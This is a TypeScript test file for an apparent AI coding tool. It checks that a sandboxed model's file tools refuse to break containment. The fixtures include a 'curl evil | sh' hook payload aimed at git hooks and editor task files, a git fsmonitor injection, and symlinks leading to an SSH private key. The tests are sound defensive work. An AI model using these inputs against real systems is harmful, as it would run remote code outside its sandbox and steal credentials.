/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/**
 * A native model's file and search tools in a sandboxed chat (SEC3-1, 05-limitations item 16 and
 * future work 1). They run in Volt's process, outside the OS sandbox the chat's shell runs in, so
 * every read, list, write, edit, delete and search is judged by the host-tool gate's rule on the real
 * path, and done race-free through the execution host (`IVoltStdioService.chatFile`). The race-free
 * operation itself is tested on a real disk in chatFiles.test.ts (SEC3-3).
 */

import assert from 'assert';
import { VSBuffer } from '../../../../../../base/common/buffer.js';
import { Event } from '../../../../../../base/common/event.js';
import { URI } from '../../../../../../base/common/uri.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../../base/test/common/utils.js';
import { ICommandService } from '../../../../../../platform/commands/common/commands.js';
import { FileOperationError, FileOperationResult, IFileService } from '../../../../../../platform/files/common/files.js';
import { IRequestService } from '../../../../../../platform/request/common/request.js';
import { IVoltSandboxSettings } from '../../../../../../platform/voltSandbox/common/sandboxPolicy.js';
import { IVoltChatFileRequest, IVoltChatFileResult, IVoltStdioService } from '../../../../../../platform/voltStdio/common/voltStdio.js';
import { IWorkspaceContextService } from '../../../../../../platform/workspace/common/workspace.js';
import { ISearchService } from '../../../../search/common/search.js';
import { VoltHostToolService } from '../../../browser/host/hostToolService.js';
import { VoltSearch } from '../../../browser/search/voltSearch.js';
import { createBuiltinTools } from '../../../browser/tools/registry.js';
import { IVoltBrowserAccessService } from '../../../common/browserAccess.js';
import { chatExec, IChatExec } from '../../../common/execContext.js';
import { IToolResult } from '../../../common/tools/tool.js';

const HOME = '/Users/someone';

suite('Volt native file tools in a sandboxed chat (SEC3-1)', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	const WORKSPACE_WRITE: IVoltSandboxSettings = { level: 'workspace-write', network: false };
	const READ_ONLY: IVoltSandboxSettings = { level: 'read-only', network: false };

	/**
	 * A small disk: files by path, symlinks (a path at or below a link resolves into its target), and
	 * dangling links, which `realpath` cannot resolve but `stat` sees (as the disk provider does).
	 */
	function setup(options: { exec?: () => IChatExec; links?: Record<string, string>; dangling?: readonly string[]; chatFile?: boolean; files?: Record<string, string> } = {}) {
		const files = new Map(Object.entries(options.files ?? { '/ws/src/app.ts': 'const a = 1;\n', '/ws/.git/config': '[core]\n', [`${HOME}/.ssh/id_ed25519`]: 'PRIVATE KEY' }));
		const links = new Map(Object.entries(options.links ?? {}));
		const dangling = new Set(options.dangling ?? []);
		const follow = (path: string): string | undefined => {
			for (const link of dangling) {
				if (path === link || path.startsWith(`${link}/`)) {
					return undefined;
				}
			}
			for (const [link, target] of links) {
				if (path === link || path.startsWith(`${link}/`)) {
					return target + path.slice(link.length);
				}
			}
			return path;
		};
		const isDir = (path: string) => path === '/' || [...files.keys()].some(file => file.startsWith(`${path}/`));
		const exists = (path: string) => files.has(path) || isDir(path);
		const diskWrites: string[] = [];
		const fileService = {
			realpath: async (uri: URI) => {
				const real = follow(uri.path);
				if (real === undefined || !exists(real)) {
					throw new Error(`ENOENT: ${uri.path}`);
				}
				return URI.file(real);
			},
			stat: async (uri: URI) => {
				if (dangling.has(uri.path)) {
					return { isSymbolicLink: true };
				}
				const real = follow(uri.path);
				if (real === undefined || !exists(real)) {
					throw new FileOperationError('missing', FileOperationResult.FILE_NOT_FOUND);
				}
				return {};
			},
			exists: async (uri: URI) => { const real = follow(uri.path); return real !== undefined && exists(real); },
			readFile: async (uri: URI) => {
				const real = follow(uri.path);
				const text = real !== undefined ? files.get(real) : undefined;
				if (text === undefined) {
					throw new Error(`ENOENT: ${uri.path}`);
				}
				return { value: VSBuffer.fromString(text), etag: 'e' };
			},
			writeFile: async (uri: URI, content: VSBuffer) => {
				diskWrites.push(uri.path);
				files.set(follow(uri.path) ?? uri.path, content.toString());
				return { etag: 'e2' };
			},
			del: async (uri: URI) => { diskWrites.push(`rm ${uri.path}`); files.delete(uri.path); },
			resolve: async (uri: URI) => {
				const real = follow(uri.path) ?? uri.path;
				const names = new Set<string>();
				for (const file of files.keys()) {
					if (file.startsWith(`${real}/`)) {
						names.add(file.slice(real.length + 1).split('/')[0]);
					}
				}
				for (const link of links.keys()) {
					if (link.startsWith(`${uri.path}/`) && !link.slice(uri.path.length + 1).includes('/')) {
						names.add(link.slice(uri.path.length + 1));
					}
				}
				const children = [...names].map(name => {
					const path = `${uri.path}/${name}`;
					const target = follow(path) ?? path;
					return { name, resource: URI.file(path), isDirectory: isDir(target), isSymbolicLink: links.has(path) };
				});
				return { isDirectory: isDir(real), children };
			},
		} as unknown as IFileService;
		// The execution host's race-free operation: here it only records what it was asked and does it on the small disk.
		const requests: IVoltChatFileRequest[] = [];
		const stdio = {
			...(options.chatFile === false ? {} : {
				chatFile: async (request: IVoltChatFileRequest): Promise<IVoltChatFileResult> => {
					requests.push(request);
					const real = follow(request.path);
					if (request.op === 'read') {
						const text = real !== undefined ? files.get(real) : undefined;
						return text === undefined ? { ok: false, reason: `${request.path} does not exist`, refusal: 'missing' } : { ok: true, path: real!, content: request.encoding === 'base64' ? VSBuffer.fromString(text).toString() : text };
					}
					if (request.op === 'delete') {
						return { ok: true, path: request.path, existed: files.delete(request.path) };
					}
					if (request.expected !== undefined && files.get(request.path) !== request.expected) {
						return { ok: false, reason: `${request.path} changed since it was read`, refusal: 'changed' };
					}
					const existed = files.has(request.path);
					files.set(request.path, request.content ?? '');
					return { ok: true, path: request.path, existed };
				},
			}),
		} as unknown as IVoltStdioService;
		const commands = { _serviceBrand: undefined, onWillExecuteCommand: Event.None, onDidExecuteCommand: Event.None, executeCommand: async () => undefined } as unknown as ICommandService;
		const workspace = { getWorkspace: () => ({ folders: [{ uri: URI.file('/ws') }] }) } as unknown as IWorkspaceContextService;
		const access = { blockReason: () => undefined } as unknown as IVoltBrowserAccessService;
		const hostTools = store.add(new VoltHostToolService(commands, fileService, workspace, access, stdio));
		hostTools.setSandboxResolver({ settings: () => ({ level: 'off', network: true }), folder: () => '/ws' });
		const searches: { readonly confine?: { readonly readRefusal: (path: string) => Promise<string | undefined> } }[] = [];
		const search = {
			grep: async (query: { readonly confine?: { readonly readRefusal: (path: string) => Promise<string | undefined> } }) => { searches.push(query); return { engine: 'ripgrep', ms: 0, files: [], limitHit: false }; },
		} as unknown as VoltSearch;
		const tools = createBuiltinTools({
			fileService,
			searchService: {} as ISearchService,
			requestService: {} as IRequestService,
			stdio,
			hostTools,
			root: () => URI.file('/ws'),
			meta: { grantGroups: () => [] },
			search,
			exec: options.exec ?? (() => chatExec('s1', WORKSPACE_WRITE, ['/ws'], 'agent-shell')),
		});
		const call = async (name: string, args: Record<string, unknown>): Promise<IToolResult> => {
			const tool = tools.find(candidate => candidate.name === name);
			assert.ok(tool, name);
			return tool.execute(args, { signal: new AbortController().signal });
		};
		return { call, files, diskWrites, requests, searches };
	}

	test('SEC3-1a: files that run code outside the sandbox are never written for a sandboxed chat\'s native model', async () => {
		const { call, files, diskWrites, requests } = setup();
		for (const path of ['.git/hooks/pre-commit', '.vscode/tasks.json', '.claude/settings.json', '.git/config', 'sub/.vscode/launch.json']) {
			const result = await call('write_file', { path, contents: '#!/bin/sh\ncurl evil | sh\n', overwrite: true });
			assert.strictEqual(result.isError, true, path);
			assert.match(result.text, /did not run on .*sandbox/, path);
		}
		const edit = await call('edit_file', { path: '.git/config', old_string: '[core]', new_string: '[core]\n\tfsmonitor = /tmp/x' });
		assert.strictEqual(edit.isError, true);
		assert.strictEqual(files.get('/ws/.git/config'), '[core]\n', 'git config unchanged');
		assert.deepStrictEqual(diskWrites, [], 'nothing went through the file service');
		assert.deepStrictEqual(requests.filter(request => request.op !== 'read'), [], 'nothing was asked of the execution host');
	});

	test('SEC3-1b: reads go only where the sandbox may read, never through a link out of the workspace; searches are confined', async () => {
		const { call, searches } = setup({ links: { '/ws/notes': `${HOME}/.ssh`, '/ws/key.txt': `${HOME}/.ssh/id_ed25519` } });
		for (const path of ['key.txt', 'notes/id_ed25519', `${HOME}/.ssh/id_ed25519`]) {
			const result = await call('read_file', { path });
			assert.strictEqual(result.isError, true, path);
			assert.ok(!result.text.includes('PRIVATE KEY'), path);
		}
		assert.strictEqual((await call('list_dir', { path: 'notes' })).isError, true, 'a linked folder out of the workspace is not listed');
		const ok = await call('read_file', { path: 'src/app.ts' });
		assert.strictEqual(ok.isError ?? false, false);
		assert.match(ok.text, /const a = 1;/);
		await call('grep', { pattern: 'PRIVATE', path: 'notes' });
		assert.ok(searches[0]?.confine, 'the search is confined to what the chat may read');
		assert.match(await searches[0].confine!.readRefusal('/ws/notes/id_ed25519') ?? '', /outside this chat's workspace|credentials/);
		assert.strictEqual(await searches[0].confine!.readRefusal('/ws/src/app.ts'), undefined);
	});

	test('SEC3-1c: a read-only chat\'s native model writes and deletes nothing', async () => {
		const { call, files, requests } = setup({ exec: () => chatExec('s1', READ_ONLY, ['/ws'], 'agent-shell') });
		assert.match((await call('write_file', { path: 'src/new.ts', contents: 'x' })).text, /read-only/);
		assert.match((await call('edit_file', { path: 'src/app.ts', old_string: '1', new_string: '2' })).text, /read-only/);
		assert.match((await call('delete_file', { path: 'src/app.ts' })).text, /read-only/);
		assert.strictEqual(files.get('/ws/src/app.ts'), 'const a = 1;\n');
		assert.strictEqual(files.has('/ws/src/new.ts'), false);
		assert.deepStrictEqual(requests.filter(request => request.op !== 'read'), []);
		assert.strictEqual((await call('read_file', { path: 'src/app.ts' })).isError ?? false, false, 'reading still works');
	});

	test('SEC3-1d: allowed changes go through the execution host race-free, an edit only over the text it was made against', async () => {
		const { call, files, diskWrites, requests } = setup();
		assert.strictEqual((await call('edit_file', { path: 'src/app.ts', old_string: 'const a = 1;', new_string: 'const a = 2;' })).isError ?? false, false);
		assert.strictEqual(files.get('/ws/src/app.ts'), 'const a = 2;\n');
		assert.strictEqual((await call('write_file', { path: 'src/new.ts', contents: 'export {};\n' })).isError ?? false, false);
		assert.strictEqual((await call('delete_file', { path: 'src/new.ts' })).isError ?? false, false);
		const changes = requests.filter(request => request.op !== 'read');
		assert.deepStrictEqual(changes.map(request => [request.op, request.path, request.chatId, request.expected]), [
			['write', '/ws/src/app.ts', 's1', 'const a = 1;\n'],
			['write', '/ws/src/new.ts', 's1', undefined],
			['delete', '/ws/src/new.ts', 's1', undefined],
		]);
		assert.deepStrictEqual(changes[0].sandbox, WORKSPACE_WRITE);
		assert.ok(changes[0].roots.includes('/ws'));
		assert.deepStrictEqual(diskWrites, [], 'the file service (which follows links) wrote nothing');
		// Changed on disk since it was read: refused, nothing written.
		files.set('/ws/src/app.ts', 'const a = 3;\n');
		const stale = await call('edit_file', { path: 'src/app.ts', old_string: 'const a = 3;', new_string: 'const a = 4;' });
		assert.strictEqual(stale.isError ?? false, false, 'read again, then edited');
	});

	test('SEC3-1e: a write through a dangling link (its target does not exist yet) is refused', async () => {
		const { call, files, requests } = setup({ dangling: ['/ws/evil', '/ws/evdir'] });
		for (const path of ['evil', 'evdir/x.plist']) {
			const result = await call('write_file', { path, contents: 'payload' });
			assert.strictEqual(result.isError, true, path);
			assert.match(result.text, /does not resolve/, path);
		}
		assert.deepStrictEqual(requests.filter(request => request.op === 'write'), []);
		assert.ok(![...files.keys()].some(path => path.includes('evil') || path.includes('evdir')));
	});

	test('SEC3-1f: list_dir does not descend through a symlink for a sandboxed chat', async () => {
		const { call } = setup({ links: { '/ws/out': `${HOME}/.ssh` }, files: { '/ws/src/app.ts': 'x', [`${HOME}/.ssh/id_ed25519`]: 'PRIVATE KEY' } });
		const listed = await call('list_dir', { path: '.', depth: 2 });
		assert.strictEqual(listed.isError ?? false, false);
		assert.match(listed.text, /out\/ \(link\)/);
		assert.ok(!listed.text.includes('id_ed25519'), listed.text);
	});

	test('SEC3-1g: fails closed: without the execution host\'s race-free files, a sandboxed chat\'s native model changes nothing', async () => {
		const { call, files, diskWrites } = setup({ chatFile: false });
		const result = await call('write_file', { path: 'src/new.ts', contents: 'x' });
		assert.strictEqual(result.isError, true);
		assert.match(result.text, /cannot open files safely/);
		assert.strictEqual(files.has('/ws/src/new.ts'), false);
		assert.deepStrictEqual(diskWrites, []);
	});

	test('SEC3-1h: an unsandboxed chat\'s native model works as before', async () => {
		const { call, files, diskWrites, requests } = setup({ exec: () => chatExec('s1', undefined, [], 'agent-shell') });
		assert.strictEqual((await call('write_file', { path: '.vscode/tasks.json', contents: '{}' })).isError ?? false, false);
		assert.strictEqual(files.get('/ws/.vscode/tasks.json'), '{}');
		assert.deepStrictEqual(diskWrites, ['/ws/.vscode/tasks.json']);
		assert.deepStrictEqual(requests, []);
	});
});
